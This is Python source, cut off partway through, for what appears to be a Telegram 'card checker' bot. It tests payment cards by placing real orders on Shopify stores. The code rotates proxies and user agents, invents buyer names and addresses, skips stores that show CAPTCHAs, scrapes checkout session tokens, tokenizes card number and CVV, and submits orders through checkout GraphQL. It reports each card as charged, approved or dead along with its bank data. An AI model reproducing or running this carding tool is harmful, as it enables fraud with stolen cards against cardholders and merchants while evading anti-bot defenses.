import aiohttp
import asyncio
import json
import re
import random
import os
import logging
from datetime import datetime, timedelta
from urllib.parse import urlparse
from fake_useragent import UserAgent

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('gate4')

ua = UserAgent()

def to_monospace(text):
    result = []
    for char in str(text):
        code = ord(char)
        if 65 <= code <= 90:
            result.append(chr(0x1D670 + (code - 65)))
        elif 97 <= code <= 122:
            result.append(chr(0x1D68A + (code - 97)))
        elif 48 <= code <= 57:
            result.append(chr(0x1D7F6 + (code - 48)))
        else:
            result.append(char)
    return ''.join(result)


def hide_site(site):
    if not site or site == 'N/A':
        return 'N/A'
    site = site.replace('https://', '').replace('http://', '')
    if len(site) > 10:
        return site[:4] + '***' + site[-6:]
    return site[:3] + '***'


def hide_proxy(proxy):
    if not proxy or proxy == 'N/A':
        return 'N/A'
    proxy = proxy.replace('http://', '').replace('https://', '')
    if '@' in proxy:
        creds, host = proxy.rsplit('@', 1)
        user_part = creds.split(':')[0] if ':' in creds else creds
        user_hidden = '***'
        if ':' in host:
            ip, port = host.rsplit(':', 1)
            if len(ip) > 6:
                ip_hidden = ip[:2] + '....' + ip[-4:]
            else:
                ip_hidden = ip[:2] + '...'
            return f"{user_hidden}@{ip_hidden}:{port}"
        return f"{user_hidden}@{host[:4]}..."
    else:
        if ':' in proxy:
            ip, port = proxy.rsplit(':', 1)
            if len(ip) > 6:
                ip_hidden = ip[:2] + '....' + ip[-4:]
            else:
                ip_hidden = ip[:2] + '...'
            return f"{ip_hidden}:{port}"
        return proxy[:4] + '...'


def format_charged_message(card, bin_info, check_time, user, response, site, amount='N/A', proxy='N/A'):
    bin_info = bin_info or {}
    brand = bin_info.get('brand', 'N/A').upper()
    card_type = bin_info.get('type', 'N/A').upper()
    level = bin_info.get('level', 'N/A').upper()
    bank = bin_info.get('bank', 'N/A').upper()
    country = bin_info.get('country', 'N/A').upper()
    country_flag = bin_info.get('country_flag', '') or bin_info.get('country_emoji', '') or bin_info.get('flag', '')
    
    bin_display = f"{to_monospace(brand)} - {to_monospace(card_type)} - {to_monospace(level)}"
    bank_display = to_monospace(bank)
    country_display = to_monospace(country)
    site_display = to_monospace(hide_site(site))
    proxy_display = to_monospace(hide_proxy(proxy))
    
    username = user.username if user.username else user.full_name
    user_link = f"tg://user?id={user.id}"
    bot_link = "https://t.me/@trial9pm"
    
    return f"""TRIAL 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 <a href="{bot_link}">✿</a>
- - - - - - - - - - - - - - - - - - - - - - - -
<a href="{bot_link}">[⌯]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{card}</code>
<a href="{bot_link}">[⌯]</a> 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {to_monospace('Charged')} -» {to_monospace(amount)}
<a href="{bot_link}">[⌯]</a> 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {to_monospace(response)}

<a href="{bot_link}">[⌯]</a> 𝗕𝗶𝗻 ⌁ {bin_display}
<a href="{bot_link}">[⌯]</a> 𝗕𝗮𝗻𝗸 ⌁ {bank_display}
<a href="{bot_link}">[⌯]</a> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_display} {country_flag}

<a href="{bot_link}">[⌯]</a> 𝗚𝗮𝘁𝗲 ⌁ {to_monospace('Shopify Auto')} {to_monospace(amount)}
<a href="{bot_link}">[⌯]</a> 𝗦𝗶𝘁𝗲 ⌁ {site_display}
<a href="{bot_link}">[⌯]</a> 𝗣𝗿𝗼𝘅𝘆 ⌁ {proxy_display}
<a href="{bot_link}">[⌯]</a> 𝗧𝗶𝗺𝗲 ⌁ {to_monospace(f'{check_time:.2f}')}'s
<a href="{bot_link}">[⌯]</a> 𝗨𝘀𝗲𝗱 𝗕𝘆 ⌁ <a href="{user_link}">{to_monospace(username)}</a>
- - - - - - - - - - - - - - - - - - - - - - - -"""


def format_approved_message(card, bin_info, check_time, user, response, site, amount='N/A', proxy='N/A'):
    bin_info = bin_info or {}
    brand = bin_info.get('brand', 'N/A').upper()
    card_type = bin_info.get('type', 'N/A').upper()
    level = bin_info.get('level', 'N/A').upper()
    bank = bin_info.get('bank', 'N/A').upper()
    country = bin_info.get('country', 'N/A').upper()
    country_flag = bin_info.get('country_flag', '') or bin_info.get('country_emoji', '') or bin_info.get('flag', '')
    
    bin_display = f"{to_monospace(brand)} - {to_monospace(card_type)} - {to_monospace(level)}"
    bank_display = to_monospace(bank)
    country_display = to_monospace(country)
    site_display = to_monospace(hide_site(site))
    proxy_display = to_monospace(hide_proxy(proxy))
    
    username = user.username if user.username else user.full_name
    user_link = f"tg://user?id={user.id}"
    bot_link = "https://t.me/@trial9pm"
    
    return f"""TRIAL 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 <a href="{bot_link}">✿</a>
- - - - - - - - - - - - - - - - - - - - - - - -
<a href="{bot_link}">[⌯]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{card}</code>
<a href="{bot_link}">[⌯]</a> 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {to_monospace('Approved')} ✅
<a href="{bot_link}">[⌯]</a> 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {to_monospace(response)}

<a href="{bot_link}">[⌯]</a> 𝗕𝗶𝗻 ⌁ {bin_display}
<a href="{bot_link}">[⌯]</a> 𝗕𝗮𝗻𝗸 ⌁ {bank_display}
<a href="{bot_link}">[⌯]</a> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_display} {country_flag}

<a href="{bot_link}">[⌯]</a> 𝗚𝗮𝘁𝗲 ⌁ {to_monospace('Shopify Auto')} {to_monospace(amount)}
<a href="{bot_link}">[⌯]</a> 𝗦𝗶𝘁𝗲 ⌁ {site_display}
<a href="{bot_link}">[⌯]</a> 𝗣𝗿𝗼𝘅𝘆 ⌁ {proxy_display}
<a href="{bot_link}">[⌯]</a> 𝗧𝗶𝗺𝗲 ⌁ {to_monospace(f'{check_time:.2f}')}'s
<a href="{bot_link}">[⌯]</a> 𝗨𝘀𝗲𝗱 𝗕𝘆 ⌁ <a href="{user_link}">{to_monospace(username)}</a>
- - - - - - - - - - - - - - - - - - - - - - - -"""


def format_declined_message(card, bin_info, check_time, user, response, site, amount='N/A', proxy='N/A'):
    bin_info = bin_info or {}
    brand = bin_info.get('brand', 'N/A').upper()
    card_type = bin_info.get('type', 'N/A').upper()
    level = bin_info.get('level', 'N/A').upper()
    bank = bin_info.get('bank', 'N/A').upper()
    country = bin_info.get('country', 'N/A').upper()
    country_flag = bin_info.get('country_flag', '') or bin_info.get('country_emoji', '') or bin_info.get('flag', '')
    
    bin_display = f"{to_monospace(brand)} - {to_monospace(card_type)} - {to_monospace(level)}"
    bank_display = to_monospace(bank)
    country_display = to_monospace(country)
    site_display = to_monospace(hide_site(site))
    proxy_display = to_monospace(hide_proxy(proxy))
    
    username = user.username if user.username else user.full_name
    user_link = f"tg://user?id={user.id}"
    bot_link = "https://t.me/@trial9pm"
    
    return f"""TRIAL 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 <a href="{bot_link}">✿</a>
- - - - - - - - - - - - - - - - - - - - - - - -
<a href="{bot_link}">[⌯]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{card}</code>
<a href="{bot_link}">[⌯]</a> 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {to_monospace('Dead!')} ❌
<a href="{bot_link}">[⌯]</a> 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {to_monospace(response)}

<a href="{bot_link}">[⌯]</a> 𝗕𝗶𝗻 ⌁ {bin_display}
<a href="{bot_link}">[⌯]</a> 𝗕𝗮𝗻𝗸 ⌁ {bank_display}
<a href="{bot_link}">[⌯]</a> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_display} {country_flag}

<a href="{bot_link}">[⌯]</a> 𝗚𝗮𝘁𝗲 ⌁ {to_monospace('Shopify Auto')} {to_monospace(amount)}
<a href="{bot_link}">[⌯]</a> 𝗦𝗶𝘁𝗲 ⌁ {site_display}
<a href="{bot_link}">[⌯]</a> 𝗣𝗿𝗼𝘅𝘆 ⌁ {proxy_display}
<a href="{bot_link}">[⌯]</a> 𝗧𝗶𝗺𝗲 ⌁ {to_monospace(f'{check_time:.2f}')}'s
<a href="{bot_link}">[⌯]</a> 𝗨𝘀𝗲𝗱 𝗕𝘆 ⌁ <a href="{user_link}">{to_monospace(username)}</a>
- - - - - - - - - - - - - - - - - - - - - - - -"""


CAPTCHA_PATTERNS = [
    'class="g-recaptcha"',
    'class="h-captcha"',
    'class="cf-turnstile"',
    'data-sitekey=',
    'grecaptcha.render',
    'hcaptcha.render',
    'turnstile.render',
    'recaptcha/api.js',
    'hcaptcha.com/1/api.js',
    'challenges.cloudflare.com/turnstile',
    'please verify you are human',
    'prove you are human',
    'complete the captcha',
    'bot verification required'
]

class ShopifyProcessor:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.bot_sites = []
        self.user_sites = {}
        self.captcha_sites = {}
        self.load_sites()
    
    def load_sites(self):
        try:
            if os.path.exists('sites.txt'):
                with open('sites.txt', 'r') as f:
                    sites = [self.normalize_site(line.strip()) for line in f if line.strip()]
                    self.bot_sites = list(set([s for s in sites if s]))
        except Exception as e:
            print(f"Error loading sites: {e}")
    
    def save_sites(self):
        try:
            with open('sites.txt', 'w') as f:
                for site in self.bot_sites:
                    f.write(f"{site}\n")
        except Exception as e:
            print(f"Error saving sites: {e}")
    
    def normalize_site(self, url):
        if not url:
            return None
        url = url.strip().lower()
        
        # Remove www
        if url.startswith('www.'):
            url = url[4:]
        
        # Add https if missing
        if not url.startswith(('http://', 'https://')):
            url = f'https://{url}'
        
        # Remove trailing slash
        url = url.rstrip('/')
        
        # Parse and reconstruct
        parsed = urlparse(url)
        return f"https://{parsed.netloc}"
    
    def get_random_address(self):
        """Generate random US addresses"""
        streets = [
            "123 Main St", "456 Oak Ave", "789 Pine Rd", "101 Maple Ln", 
            "202 Cedar Blvd", "303 Elm St", "404 Birch Ave", "505 Spruce Rd",
            "606 Walnut St", "707 Chestnut Ave", "808 Poplar Rd", "909 Hickory Ln",
            "111 Park Ave", "222 Broadway", "333 Madison St", "444 5th Ave"
        ]
        
        cities_states_zips = [
            ("New York", "NY", "10001"),
            ("Los Angeles", "CA", "90001"),
            ("Chicago", "IL", "60601"),
            ("Houston", "TX", "77001"),
            ("Phoenix", "AZ", "85001"),
            ("Philadelphia", "PA", "19101"),
            ("San Antonio", "TX", "78201"),
            ("San Diego", "CA", "92101"),
            ("Dallas", "TX", "75201"),
            ("San Jose", "CA", "95101"),
            ("Austin", "TX", "73301"),
            ("Jacksonville", "FL", "32099"),
            ("Fort Worth", "TX", "76101"),
            ("Columbus", "OH", "43085"),
            ("Charlotte", "NC", "28201")
        ]
        
        street = random.choice(streets)
        city, state, zip_code = random.choice(cities_states_zips)
        
        # Generate random phone number
        area_code = random.randint(200, 999)
        prefix = random.randint(100, 999)
        line = random.randint(1000, 9999)
        phone = f"+1{area_code}{prefix}{line}"
        
        return {
            "street": f"{random.randint(100, 9999)} {street}",
            "city": city,
            "state": state,
            "zip": zip_code,
            "phone": phone
        }
    
    def get_random_name_email(self):
        """Generate random name and email"""
        firstNames = ["John", "Emily", "Michael", "Sarah", "William", "Olivia", 
                     "James", "Emma", "David", "Sophia", "Robert", "Ava",
                     "Joseph", "Isabella", "Thomas", "Mia", "Charles", "Charlotte",
                     "Daniel", "Amelia", "Matthew", "Harper", "Anthony", "Evelyn"]
        
        lastNames = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", 
                    "Miller", "Wilson", "Moore", "Taylor", "Anderson", "Thomas",
                    "Jackson", "White", "Harris", "Martin", "Thompson", "Garcia",
                    "Martinez", "Robinson", "Clark", "Rodriguez", "Lewis", "Lee"]
        
        firstName = random.choice(firstNames)
        lastName = random.choice(lastNames)
        random_num = random.randint(1000, 9999)
        email_domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
        email = f"{firstName.lower()}.{lastName.lower()}{random_num}@{random.choice(email_domains)}"
        
        return firstName, lastName, email
    
    def add_bot_site(self, site):
        site = self.normalize_site(site)
        if site and site not in self.bot_sites:
            self.bot_sites.append(site)
            self.save_sites()
            return True
        return False
    
    def remove_bot_site(self, site):
        site = self.normalize_site(site)
        if site in self.bot_sites:
            self.bot_sites.remove(site)
            self.save_sites()
            return True
        return False
    
    def add_user_site(self, user_id, site):
        site = self.normalize_site(site)
        if not site:
            return False
        if user_id not in self.user_sites:
            self.user_sites[user_id] = []
        if site not in self.user_sites[user_id]:
            self.user_sites[user_id].append(site)
            return True
        return False
    
    def remove_user_site(self, user_id, site):
        site = self.normalize_site(site)
        if user_id in self.user_sites and site in self.user_sites[user_id]:
            self.user_sites[user_id].remove(site)
            return True
        return False
    
    def get_user_sites(self, user_id):
        return self.user_sites.get(user_id, [])
    
    def get_all_bot_sites(self):
        return self.bot_sites.copy()
    
    def get_random_site(self, user_id=None, use_user_sites=False):
        sites = []
        
        if use_user_sites and user_id in self.user_sites and self.user_sites[user_id]:
            sites.extend(self.user_sites[user_id])
        
        sites.extend(self.bot_sites)
        
        if not sites:
            return None
        
        # Filter out captcha blocked sites
        available_sites = []
        for site in sites:
            if not self.is_captcha_blocked(site):
                available_sites.append(site)
        
        if not available_sites:
            return None
        
        return random.choice(available_sites)
    
    def mark_captcha_site(self, site):
        site = self.normalize_site(site)
        self.captcha_sites[site] = datetime.now()
    
    def is_captcha_blocked(self, site):
        site = self.normalize_site(site)
        if site in self.captcha_sites:
            blocked_time = self.captcha_sites[site]
            if datetime.now() - blocked_time < timedelta(hours=48):
                return True
            else:
                del self.captcha_sites[site]
        return False
    
    def clear_captcha_cache(self):
        self.captcha_sites = {}
    
    def is_captcha_error(self, text):
        if not text:
            return False
        text_lower = text.lower()
        return any(pattern.lower() in text_lower for pattern in CAPTCHA_PATTERNS)
    
    def get_proxy(self):
        if not self.proxies:
            return None
        
        # Shuffle proxies for better rotation
        random.shuffle(self.proxies)
        proxy = random.choice(self.proxies)
        
        # Format proxy if needed
        if ':' in proxy and '@' not in proxy:
            parts = proxy.split(':')
            if len(parts) == 4:  # ip:port:user:pass
                proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif len(parts) == 2:  # ip:port
                proxy = f"http://{proxy}"
        
        return proxy
    
    async def check_site(self, site):
        site = self.normalize_site(site)
        if not site:
            return {"status": "error", "message": "Invalid site URL"}
        
        if self.is_captcha_blocked(site):
            return {"status": "captcha_blocked", "message": "Site has captcha, will recover in 24-48hrs"}
        
        proxy = self.get_proxy()
        headers = {'User-Agent': ua.random}
        
        try:
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(f"{site}/products.json?limit=1", headers=headers, proxy=proxy) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if 'products' in data and len(data['products']) > 0:
                            product = data['products'][0]
                            title = product.get('title', 'Unknown')
                            variants = product.get('variants', [])
                            if variants:
                                price = variants[0].get('price', '0')
                                return {"status": "working", "message": f"Site working! Product: {title} - ${price}"}
                        return {"status": "no_products", "message": "Site has no products"}
                    
                    text = await resp.text()
                    if self.is_captcha_error(text):
                        self.mark_captcha_site(site)
                        return {"status": "captcha", "message": "Captcha detected, site will recover in 24-48hrs"}
                    
                    return {"status": "error", "message": f"HTTP {resp.status}"}
        except Exception as e:
            return {"status": "error", "message": str(e)[:100]}
    
    async def check_all_sites(self, callback=None):
        results = {"working": [], "failed": [], "captcha": []}
        
        for site in self.bot_sites.copy():
            result = await self.check_site(site)
            site_status = None
            if result["status"] == "working":
                results["working"].append(site)
                site_status = ("working", site, result.get("message", ""))
            elif result["status"] == "captcha" or result["status"] == "captcha_blocked":
                results["captcha"].append(site)
                site_status = ("captcha", site, result.get("message", ""))
            else:
                self.remove_bot_site(site)
                results["failed"].append(site)
                site_status = ("failed", site, result.get("message", ""))
            
            if callback and site_status:
                await callback(site_status)
        
        return results
    
    def extract_between(self, text, start, end):
        try:
            if not text or not isinstance(text, str):
                return None
            if start not in text:
                return None
            first_split = text.split(start, 1)
            if len(first_split) < 2:
                return None
            second_split = first_split[1].split(end, 1)
            if len(second_split) < 1:
                return None
            return second_split[0]
        except:
            return None
    
    async def process_card(self, cc, mes, ano, cvv, user_id=None, use_user_sites=False):
        max_site_attempts = 5
        max_retries_per_site = 2
        
        for attempt in range(max_site_attempts):
            site = self.get_random_site(user_id, use_user_sites)
            if not site:
                return {"status": "error", "message": "No sites available", "site": None}
            
            # Try each site multiple times
            for retry in range(max_retries_per_site):
                logger.info(f"[Gate4] Attempt {attempt+1}, Retry {retry+1} on site: {site}")
                
                # Random delay between retries
                if retry > 0:
                    await asyncio.sleep(random.uniform(2, 5))
                
                result = await self._check_card_on_site(cc, mes, ano, cvv, site)
                
                if result.get("status") in ["charged", "approved", "declined"]:
                    return result
                
                if not result.get("retry_site", False):
                    break
            
            # Mark site as problematic if all retries failed
            if result.get("status") == "error":
                self.mark_captcha_site(site)
        
        return {"status": "error", "message": "All sites failed, try again later", "site": None}
    
    async def _check_card_on_site(self, cc, mes, ano, cvv, site):
        proxy = self.get_proxy()
        proxy_used = proxy or 'Direct'
        amount = 'N/A'
        
        # Random User-Agent
        headers = {
            'User-Agent': ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        if len(ano) == 2:
            ano = f"20{ano}"
        
        logger.info(f"[Gate4] Checking card on site: {site}")
        
        # Generate random details for every attempt
        firstName, lastName, email = self.get_random_name_email()
        addr = self.get_random_address()
        
        formatted_cc = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
        
        try:
            timeout = aiohttp.ClientTimeout(total=60)
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                # Fetch products with better headers
                products_resp = await session.get(
                    f"{site}/products.json?limit=10", 
                    headers={**headers, 'Accept': 'application/json'},
                    proxy=proxy
                )
                
                if products_resp.status != 200:
                    text = await products_resp.text()
                    if self.is_captcha_error(text):
                        self.mark_captcha_site(site)
                        return {"status": "error", "message": "Captcha detected", "site": site, "retry_site": True}
                    return {"status": "error", "message": f"Cannot fetch products: HTTP {products_resp.status}", "site": site, "retry_site": True}
                
                products_data = await products_resp.json()
                products = products_data.get('products', [])
                
                if not products:
                    return {"status": "error", "message": "No products found", "site": site, "retry_site": True}
                
                # Product selection logic - random available product
                available_products = []
                for p in products:
                    for v in p.get('variants', []):
                        if v.get('available', True):
                            available_products.append((p, v))
                
                if not available_products:
                    # Fallback to first product
                    for p in products:
                        if p.get('variants'):
                            available_products.append((p, p['variants'][0]))
                
                if not available_products:
                    return {"status": "error", "message": "No available variants", "site": site, "retry_site": True}
                
                product, variant = random.choice(available_products)
                variant_id = variant.get('id')
                
                try:
                    price = float(variant.get('price', 1.0))
                    amount = f"${price:.2f}"
                except:
                    price = 1.0
                    amount = "$1.00"
                
                logger.info(f"[Gate4] Selected product: {product.get('title', 'Unknown')}, price: {amount}")
                
                # Random delay before adding to cart
                await asyncio.sleep(random.uniform(0.5, 1.5))
                
                # Add to cart
                cart_headers = {
                    **headers,
                    'Content-Type': 'application/json',
                    'Origin': site,
                    'Referer': f'{site}/products/{product.get("handle", "")}'
                }
                
                cart_resp = await session.post(
                    f"{site}/cart/add.js",
                    json={'id': variant_id, 'quantity': 1},
                    headers=cart_headers,
                    proxy=proxy
                )
                
                if cart_resp.status != 200:
                    text = await cart_resp.text()
                    if self.is_captcha_error(text):
                        self.mark_captcha_site(site)
                        return {"status": "error", "message": "Captcha detected at cart", "site": site, "retry_site": True}
                    return {"status": "error", "message": "Failed to add to cart", "site": site, "retry_site": True}
                
                # Random delay before checkout
                await asyncio.sleep(random.uniform(1, 2))
                
                # Get checkout page
                checkout_resp = await session.post(
                    f"{site}/checkout",
                    headers={**headers, 'Referer': f'{site}/cart'},
                    proxy=proxy,
                    allow_redirects=True
                )
                
                checkout_url = str(checkout_resp.url)
                
                if 'login' in checkout_url.lower() or 'password' in checkout_url.lower():
                    return {"status": "error", "message": "Site requires login", "site": site, "retry_site": True}
                
                checkout_resp2 = await session.get(
                    checkout_url, 
                    headers=headers, 
                    proxy=proxy
                )
                checkout_html = await checkout_resp2.text()
                
                # Extract session token with multiple patterns
                sst = None
                patterns = [
                    r'serialized-session-token"\s*content="&quot;([^&]+)&quot;',
                    r'name="serialized-session-token"\s*content="&quot;([^&]+)&quot;',
                    r'"sessionToken":"([^"]+)"',
                    r"'sessionToken': '([^']+)'"
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, checkout_html)
                    if match:
                        sst = match.group(1)
                        break
                
                if not sst:
                    logger.warning(f"[Gate4] Cannot extract session token on {site}")
                    return {"status": "error", "message": "Cannot extract session token", "site": site, "retry_site": True}
                
                # Extract currency and country from site
                currency = 'USD'
                country_code = 'US'
                
                # Try multiple patterns for currency
                currency_patterns = [
                    r'currencyCode&quot;:&quot;([^&]+)&quot;',
                    r'"currency":"([^"]+)"',
                    r"'currency': '([^']+)'",
                    r'presentmentCurrency&quot;:&quot;([^&]+)&quot;'
                ]
                
                for pattern in currency_patterns:
                    match = re.search(pattern, checkout_html)
                    if match:
                        currency = match.group(1)
                        break
                
                # Try multiple patterns for country
                country_patterns = [
                    r'countryCode&quot;:&quot;([A-Z]{2})&quot;',
                    r'"country":"([A-Z]{2})"',
                    r"'country': '([A-Z]{2})'",
                    r'countryCode":"([A-Z]{2})"'
                ]
                
                for pattern in country_patterns:
                    match = re.search(pattern, checkout_html)
                    if match:
                        country_code = match.group(1)
                        break
                
                logger.info(f"[Gate4] Detected currency: {currency}, country: {country_code}")
                
                # Extract other tokens
                queue_token = self.extract_between(checkout_html, 'queueToken&quot;:&quot;', '&q') or ''
                stable_id = self.extract_between(checkout_html, 'stableId&quot;:&quot;', '&q') or 'line-0'
                payment_id = self.extract_between(checkout_html, 'paymentMethodIdentifier&quot;:&quot;', '&q') or 'https://deposit.shopifycs.com/sessions'
                
                logger.info(f"[Gate4] Got session token, queue_token: {queue_token[:20]}...")
                
                # GraphQL endpoint
                graphql_url = f"{site}/checkouts/unstable/graphql"
                
                # Proposal query
                proposal_query = '''query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$delivery:DeliveryTermsInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$payment:PaymentTermInput,$discounts:DiscountTermsInput,$taxes:TaxTermInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,merchandise:$merchandise,buyerIdentity:$buyerIdentity,payment:$payment,discounts:$discounts,taxes:$taxes},queueToken:$queueToken}){result{__typename ...on NegotiationResultAvailable{queueToken sellerProposal{runningTotal}}}errors{code}}}}'''
                
                proposal_vars = {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queue_token,
                    'buyerIdentity': {
                        'email': email,
                        'customer': {
                            'countryCode': country_code,
                            'presentmentCurrency': currency
                        }
                    },
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': addr['street'], 
                                    'city': addr['city'],
                                    'countryCode': country_code, 
                                    'postalCode': addr['zip'],
                                    'firstName': firstName, 
                                    'lastName': lastName,
                                    'zoneCode': addr['state'], 
                                    'phone': addr['phone']
                                }
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True}, 
                                    'shipments': {'any': True}
                                }
                            },
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [],
                        'supportsSplitShipping': True
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stable_id,
                            'merchandise': {'productVariantReference': {
                                'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                'properties': []
                            }},
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'any': True}
                        }]
                    },
                    'payment': {'totalAmount': {'any': True}, 'paymentLines': []},
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'taxes': {'proposedTotalAmount': {'any': True}, 'proposedExemptions': []}
                }
                
                # Try proposal multiple times
                for prop_attempt in range(5):
                    proposal_vars['queueToken'] = queue_token
                    prop_resp = await session.post(
                        graphql_url, 
                        json={
                            'query': proposal_query,
                            'variables': proposal_vars,
                            'operationName': 'Proposal'
                        }, 
                        headers=headers, 
                        proxy=proxy
                    )
                    prop_text = await prop_resp.text()
                    
                    try:
                        prop_data = json.loads(prop_text)
                        result = prop_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                        new_queue = result.get('queueToken')
                        if new_queue:
                            queue_token = new_queue
                    except:
                        pass
                    
                    if 'WAITING_PENDING_TERMS' not in prop_text:
                        logger.info(f"[Gate4] Proposal resolved after {prop_attempt + 1} attempts")
                        break
                    await asyncio.sleep(2)
                
                # Tokenize card
                card_payload = {
                    "credit_card": {
                        "number": formatted_cc, 
                        "month": mes, 
                        "year": ano,
                        "verification_value": cvv, 
                        "name": f"{firstName} {lastName}"
                    },
                    "payment_session_scope": urlparse(site).netloc
                }
                
                payment_token = None
                payment_endpoints = [
                    'https://checkout.pci.shopifyinc.com/sessions',
                    'https://deposit.shopifycs.com/sessions'
                ]
                
                for endpoint in payment_endpoints:
                    try:
                        card_resp = await session.post(
                            endpoint, 
                            json=card_payload, 
                            headers={
                                'Content-Type': 'application/json', 
                                'User-Agent': headers['User-Agent']
                            }, 
                            proxy=proxy
                        )
                        card_result = await card_resp.json()
                        payment_token = card_result.get('id')
                        if payment_token:
                            break
                    except:
                        continue
                
                if not payment_token:
                    return {"status": "error", "message": "Cannot tokenize card", "site": site, "retry_site": True}
                
                logger.info(f"[Gate4] Card tokenized, payment_token: {payment_token[:20]}...")
                
                # Submit query
                submit_query = '''mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input,attemptToken:$attemptToken){__typename ...on SubmitSuccess{receipt{__typename ...on ProcessedReceipt{id orderIdentity{id}}...on ProcessingReceipt{id pollDelay}...on FailedReceipt{id processingError{__typename ...on PaymentFailed{code messageUntranslated}}}...on ActionRequiredReceipt{id}...on WaitingReceipt{id pollDelay}}}...on SubmitFailed{reason}...on SubmitRejected{errors{code nonLocalizedMessage localizedMessage}}...on SubmitAlreadyAccepted{receipt{__typename}}...on Throttled{pollAfter queueToken}...on SubmittedForCompletion{receipt{__typename ...on ProcessingReceipt{id pollDelay}}}}}'''
                
                # Extract attempt token
                attempt_match = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
                attempt_token = attempt_match.group(1) if attempt_match else checkout_url.split('/')[-2]
                
                submit_vars = {
                    'attemptToken': attempt_token,
                    'input': {
                        'sessionInput': {'sessionToken': sst},
                        'queueToken': queue_token,
                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                        'delivery': {
                            'deliveryLines': [{
                                'destination': {
                                    'streetAddress': {
                                        'address1': addr['street'], 
                                        'city': addr['city'],
                                        'countryCode': country_code, 
                                        'postalCode': addr['zip'],
                                        'firstName': firstName, 
                                        'lastName': lastName,
                                        'zoneCode': addr['state'], 
                                        'phone': addr['phone']
                                    }
                                },
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {'any': True},
                                        'shipments': {'any': True}
                                    }
                                },
                                'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                'deliveryMethodTypes': ['SHIPPING'],
                                'expectedTotalPrice': {'any': True},
                                'destinationChanged': True
                            }],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': False,
                            'supportsSplitShipping': True
                        },
                        'merchandise': {
                            'merchandiseLines': [{
                                'stableId': stable_id,
                                'merchandise': {'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': []
                                }},
                                'quantity': {'items': {'value': 1}},
                                'expectedTotalPrice': {'any': True}
                            }]
                        },
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [{
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': payment_id,
                                        'sessionId': payment_token,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': addr['street'], 
                                                'city': addr['city'],
                                                'countryCode': country_code, 
                                                'postalCode': addr['zip'],
                                                'firstName': firstName, 
                                                'lastName': lastName,
                                                'zoneCode': addr['state'], 
                                                'phone': addr['phone']
                                            }
                                        }
                                    }
                                },
                                'amount': {'any': True}
                            }],
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': addr['street'], 
                                    'city': addr['city'],
                                    'countryCode': country_code, 
                                    'postalCode': addr['zip'],
                                    'firstName': firstName, 
                                    'lastName': lastName,
                                    'zoneCode': addr['state'], 
                                    'phone': addr['phone']
                                }
                            }
                        },
                        'buyerIdentity': {
                            'customer': {
                                'presentmentCurrency': currency,
                                'countryCode': country_code
                            },
                            'email': email
                        },
                        'taxes': {
                            'proposedTotalAmount': {'any': True},
                            'proposedExemptions': []
                        }
                    }
                }
                
                submit_resp = await session.post(
                    graphql_url, 
                    json={
                        'query': submit_query,
                        'variables': submit_vars,
